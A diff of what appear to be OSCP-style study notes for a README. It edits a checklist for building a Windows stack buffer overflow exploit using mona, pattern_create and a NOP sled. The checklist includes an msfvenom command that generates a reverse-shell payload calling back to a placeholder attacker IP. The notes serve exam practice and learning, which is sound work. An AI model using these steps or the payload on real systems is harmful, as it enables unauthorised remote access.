@@ -9,7 +9,8 @@ I then coded myfuzz.py and myexp.py on my own and for practice.
 I also made a quick script, badchars.py to generate string that removes bad characters.
 
 ## Example of badchars.py when submitting \x00\x01\x02 as bad chars
-## notice the output starts at \x03 skipping over the bad chars
+
+notice the output starts at \x03 skipping over the bad chars
 
     python3 badchars.py
 
@@ -43,18 +44,18 @@ I also made a quick script, badchars.py to generate string that removes bad char
   - !mona config -set workingfolder c:\mona\%p
 - fuzz to find crash point with myfuzz.py
 - generate pattern to find EIP offset
-  - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <fuzzing break point>
+  - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (fuzzing break point)
 - put character pattern "payload" in myexp.py
 - find eip offset
-  - !mona findmsp -distance <break point>
+  - !mona findmsp -distance (fuzzing break point)
 - add offset to myexp.py and RETN with "BBBB" eip should have "42424242" to verify we've overwritten EIP
 - check bad chars
   - create char list for mona !mona bytearray -b "\x00"
   - create local list with badchars.py
   - put badchars.py output in myexp.py payload then run
 - check bad chars in mona with esp address 
-  - !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP Address>
-- find jmp esp - !mona jmp -r esp -cpb "<found bad chars>"
+  - !mona compare -f C:\mona\oscp\bytearray.bin -a (ESP Address)
+- find jmp esp - !mona jmp -r esp -cpb "(found bad chars)"
 - generate shell code with msfvenom msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
 - Add NOP sled to prepend in myexp.py 
   - prepend = "\x90" * 16 in myexp.py
